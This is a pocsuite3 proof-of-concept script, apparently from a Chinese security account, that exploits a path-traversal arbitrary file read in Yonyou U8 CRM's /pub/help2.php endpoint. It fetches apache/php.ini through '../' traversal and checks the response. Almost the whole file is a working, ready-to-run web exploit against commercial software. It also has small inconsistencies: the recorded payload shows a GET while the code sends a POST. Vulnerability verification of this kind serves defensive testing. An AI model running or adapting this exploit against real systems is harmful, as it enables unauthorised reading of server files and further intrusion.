# _*_ coding:utf-8 _*_
# @Time : 2023/12/19 20:11
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str


class U8CRM(POCBase):
    pocDesc = '''用友U8 CRM系统help2 任意文件读取漏洞'''
    vulID = '20231219'
    version = '1'
    author = '公众号网络安全透视镜'
    vulDate = '2023-12-19'
    createDate = '2023-12-19'
    updateDate = '2023-12-19'
    name = '用友U8 CRM系统help2 任意文件读取漏洞'
    appName = '用友U8 CRM'

    def _verify(self):

        result = {}
        url = self.url + '/pub/help2.php?key=/../../apache/php.ini'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
        }

        payload = """
                    GET /pub/help2.php?key=/../../apache/php.ini HTTP/1.1
                    Host: 
                    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
                    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
                    Accept-Encoding: gzip, deflate
                    DNT: 1
                    Connection: close
                    Upgrade-Insecure-Requests: 1
        """

        try:

            response = requests.post(url, headers=headers)
            text = response.text
            if response.status_code == 200 and 'About php.ini' in text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload

            return self.parse_output(result)
        except Exception as e:
            pass


register_poc(U8CRM)